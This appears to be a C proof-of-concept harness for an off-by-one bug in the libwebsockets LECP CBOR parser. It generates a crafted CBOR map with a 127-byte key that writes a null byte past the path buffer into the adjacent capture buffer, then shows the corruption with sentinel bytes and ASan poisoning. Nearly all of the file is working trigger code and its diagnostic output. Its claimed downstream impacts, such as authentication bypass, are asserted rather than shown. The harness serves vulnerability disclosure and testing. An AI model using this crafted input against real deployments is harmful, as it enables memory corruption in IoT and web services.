/*
 * PoC harness for LECP path construction off-by-one (lecp.c:789-792)
 *
 * Demonstrates CONTROLLED WRITE impact — the null byte
 * overwrites cbor[0], corrupting CBOR literal capture state. Shows
 * the before/after corruption of the adjacent struct member.
 *
 *
 *
 * Usage: ./poc_lecp_offby1_harness   (CBOR is generated inline)
 */

#include <libwebsockets.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <stddef.h>

#if defined(__SANITIZER__)  || defined(__has_feature)
#  if defined(__has_feature)
#    if __has_feature(address_sanitizer)
#      define HAS_ASAN 1
#    endif
#  endif
#endif

#if defined(__SANITIZE_ADDRESS__) || defined(HAS_ASAN)
#  define USE_ASAN_POISON 1
void __asan_poison_memory_region(void const volatile *addr, size_t size);
void __asan_unpoison_memory_region(void const volatile *addr, size_t size);
#else
#  define USE_ASAN_POISON 0
#  define __asan_poison_memory_region(addr, size)   ((void)(addr), (void)(size))
#  define __asan_unpoison_memory_region(addr, size) ((void)(addr), (void)(size))
#endif

static signed char
cb(struct lecp_ctx *ctx, char reason)
{
    (void)ctx;
    (void)reason;
    return 0;
}

static const char * const tok[] = { "dummy___" };

/*
 * Generate the CBOR payload inline:
 * A map with 1 entry, key = 127-byte text string, value = 0
 *
 *   A1           - map(1)
 *   78 7F        - text string, 1-byte length = 127
 *   <127 bytes>  - "AAA...A"
 *   00           - unsigned integer 0
 *
 * When ppos=1 (from '.' map prefix) and npos=127 (key length),
 * ppos + npos = 128 = sizeof(ctx->path).
 * Check: 128 > 128 is FALSE → memcpy writes 128 bytes including
 * null terminator to path[128] = cbor[0].
 */
static size_t
generate_cbor(uint8_t *buf, size_t buflen)
{
    size_t pos = 0;

    if (buflen < 131)
        return 0;

    buf[pos++] = 0xA1;        /* map(1) */
    buf[pos++] = 0x78;        /* text, 1-byte length follows */
    buf[pos++] = 127;         /* key length = 127 */
    memset(&buf[pos], 'A', 127);
    pos += 127;
    buf[pos++] = 0x00;        /* value: unsigned integer 0 */

    return pos;
}

int
main(int argc, char *argv[])
{
    struct lecp_ctx ctx;
    uint8_t cbor_input[256];
    size_t cbor_len;
    int n;

    (void)argc;
    (void)argv;

    fprintf(stderr, "[*] LECP Path Off-by-One — Controlled Write PoC\n\n");

    fprintf(stderr, "[*] Struct layout:\n");
    fprintf(stderr, "    path  at offset %zu, size %zu\n",
            offsetof(struct lecp_ctx, path), sizeof(ctx.path));
    fprintf(stderr, "    cbor  at offset %zu, size %zu\n",
            offsetof(struct lecp_ctx, cbor), sizeof(ctx.cbor));
    fprintf(stderr, "    gap between path and cbor: %td bytes\n",
            (char *)ctx.cbor - ((char *)ctx.path + sizeof(ctx.path)));
    fprintf(stderr, "    path[128] IS cbor[0] (no padding)\n\n");

    /* Generate CBOR payload */
    cbor_len = generate_cbor(cbor_input, sizeof(cbor_input));
    fprintf(stderr, "[*] CBOR payload: %zu bytes\n", cbor_len);
    fprintf(stderr, "    Map with 1 entry: 127-byte key → triggers overflow\n");
    fprintf(stderr, "    ppos=1 (map '.') + npos=127 (key) = 128 = sizeof(path)\n");
    fprintf(stderr, "    Check: 128 > 128 → FALSE → memcpy proceeds\n");
    fprintf(stderr, "    Null terminator lands at path[128] = cbor[0]\n\n");

    /*
     * ===== Phase 1: Impact demonstration (no ASan poisoning) =====
     *
     * Show that cbor[0] is corrupted by the off-by-one write.
     * Pre-fill cbor[0] with a known non-zero value, then parse the
     * crafted CBOR. After parsing, verify cbor[0] was overwritten
     * with 0x00 (the null terminator from memcpy).
     */
    fprintf(stderr, "[*] Phase 1: Corruption impact (controlled write)\n\n");

    lecp_construct(&ctx, cb, NULL, tok, LWS_ARRAY_SIZE(tok));

    /* Pre-fill cbor[0..7] with sentinel pattern */
    uint8_t sentinel = 0xCC;
    memset(ctx.cbor, sentinel, 8);

    fprintf(stderr, "    Before parsing:\n");
    fprintf(stderr, "    cbor[0..7] = ");
    for (int i = 0; i < 8; i++)
        fprintf(stderr, "%02x ", ctx.cbor[i]);
    fprintf(stderr, "\n");

    n = lecp_parse(&ctx, cbor_input, cbor_len);

    fprintf(stderr, "    After parsing (lecp_parse returned %d):\n", n);
    fprintf(stderr, "    cbor[0..7] = ");
    for (int i = 0; i < 8; i++)
        fprintf(stderr, "%02x ", ctx.cbor[i]);
    fprintf(stderr, "\n");

    if (ctx.cbor[0] == 0x00) {
        fprintf(stderr, "\n[+] CONTROLLED WRITE CONFIRMED:\n");
        fprintf(stderr, "[+] cbor[0] changed from 0x%02x to 0x00\n", sentinel);
        fprintf(stderr, "[+] The null terminator from memcpy overwrote cbor[0]\n");
    } else if (ctx.cbor[0] != sentinel) {
        fprintf(stderr, "\n[+] cbor[0] modified: 0x%02x → 0x%02x\n",
                sentinel, ctx.cbor[0]);
        fprintf(stderr, "[+] The overflow occurred (cbor[0] changed from sentinel)\n");
    } else {
        fprintf(stderr, "\n[-] cbor[0] unchanged — overflow may not have occurred\n");
    }

    fprintf(stderr, "\n    Impact of cbor[0] = 0x00:\n");
    fprintf(stderr, "    - cbor[] is the literal CBOR capture buffer\n");
    fprintf(stderr, "    - Corruption at cbor[0] affects the next raw CBOR report\n");
    fprintf(stderr, "    - Application receives corrupted CBOR data in\n");
    fprintf(stderr, "      LECPCB_LITERAL_CBOR callback, leading to:\n");
    fprintf(stderr, "      * Incorrect data interpretation (IoT device commands)\n");
    fprintf(stderr, "      * Authentication bypass (corrupted COSE signatures)\n");
    fprintf(stderr, "      * Logic errors in CoAP/OSCORE processing\n\n");

    lecp_destruct(&ctx);

    /*
     * ===== Phase 2: ASan detection (poisoned memory) =====
     *
     * Poison cbor[0..7] to make the intra-struct overflow visible
     * to ASan. The off-by-one write to cbor[0] triggers
     * "use-after-poison" detection.
     */
    fprintf(stderr, "[*] Phase 2: ASan detection (poisoned cbor[0..7])\n\n");

    lecp_construct(&ctx, cb, NULL, tok, LWS_ARRAY_SIZE(tok));

    fprintf(stderr, "    path is at %p, cbor is at %p\n",
            (void *)ctx.path, (void *)ctx.cbor);
    fprintf(stderr, "    Poisoning cbor[0..7] (%p, 8 bytes)\n",
            (void *)ctx.cbor);

    __asan_poison_memory_region(&ctx.cbor[0], 8);

    fprintf(stderr, "    Parsing CBOR — ASan should detect write to cbor[0]...\n\n");

    n = lecp_parse(&ctx, cbor_input, cbor_len);
    fprintf(stderr, "    lecp_parse returned %d\n", n);

    /* Unpoison before destruct so cleanup doesn't trip */
    __asan_unpoison_memory_region(&ctx.cbor[0], 8);

    lecp_destruct(&ctx);

    fprintf(stderr, "\n[*] Summary:\n");
    fprintf(stderr, "    Vulnerability: lecp.c:789 uses > instead of >=\n");
    fprintf(stderr, "    Write: 0x00 (null terminator) → cbor[0]\n");
    fprintf(stderr, "    Control: attacker chooses key length (127 for top-level map)\n");
    fprintf(stderr, "    Impact: corrupts CBOR capture buffer → wrong data to application\n");

    return 0;
}
